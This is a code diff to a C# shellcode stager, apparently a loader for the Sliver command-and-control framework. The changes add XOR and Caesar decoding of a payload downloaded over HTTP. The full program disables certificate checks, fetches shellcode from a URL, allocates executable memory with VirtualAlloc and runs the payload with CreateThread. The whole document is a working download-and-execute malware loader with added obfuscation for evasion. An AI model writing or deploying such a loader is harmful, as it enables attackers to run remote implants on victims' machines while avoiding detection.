@@ -2,11 +2,13 @@
 using System.Net;
 using System.Runtime.InteropServices;
 
-namespace SliverStager
+namespace Stager
 {
     internal class Program
     {
-        private static string url = "http://10.200.26.214:80/word.exe";
+        private static string url = "http://localhost/03mzew4d.tmf";
+        private static string decryption = "xor";
+        private static char key = 'k';
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
@@ -21,7 +23,25 @@ namespace SliverStager
         {
             ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
             System.Net.WebClient client = new System.Net.WebClient();
-            byte[] shellcode = client.DownloadData(url);
+            byte[] buf = client.DownloadData(url);
+            byte[] shellcode = null;
+
+            switch (decryption)
+            {
+                case "xor":
+                    shellcode = xor(buf, key);
+                    break;
+
+                case "caesar":
+                    shellcode = caesar(buf, key);
+                    break;
+                
+                // not encoded
+                default:
+                    shellcode = buf;
+                    break;
+            }
+
             IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
             Marshal.Copy(shellcode, 0, addr, shellcode.Length);
             IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
@@ -32,6 +52,28 @@ namespace SliverStager
         public static void Main(String[] args)
         {
             DownloadAndExecute();
+        }
+
+        private static byte[] xor(byte[] buf, char key)
+        {
+            byte[] encoded = new byte[buf.Length];
+            for (int i = 0; i < buf.Length; i++)
+            {
+                encoded[i] = (byte)(((uint)buf[i] ^ (byte)key));
+            }
+
+            return encoded;
+        }
+
+        private static byte[] caesar(byte[] buf, char key)
+        {
+            byte[] encoded = new byte[buf.Length];
+            for (int i = 0; i < buf.Length; i++)
+            {
+                encoded[i] = (byte)(((uint)buf[i] - (byte)key) & 0xFF);
+            }
+
+            return encoded;
         }
     }
 }
